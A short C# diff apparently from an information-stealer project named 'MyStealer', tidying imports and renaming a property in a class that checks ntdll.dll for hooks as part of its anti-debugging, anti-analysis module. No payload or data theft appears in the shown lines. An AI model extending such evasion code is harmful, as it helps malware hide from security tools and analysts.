@@ -1,16 +1,10 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-
-namespace MyStealer.AntiDebug.Check.AntiAntiAntiDebug
+﻿namespace MyStealer.AntiDebug.Check.AntiAntiAntiDebug
 {
     internal class NtDllCheck : HookCheckBase
     {
         public override string Name => "Hooking: ntdll";
 
-        protected override string ModuleName => "ntdll.dll";
+        protected override string DllName => "ntdll.dll";
 
         protected override string[] ProcNames => new string[]
         {
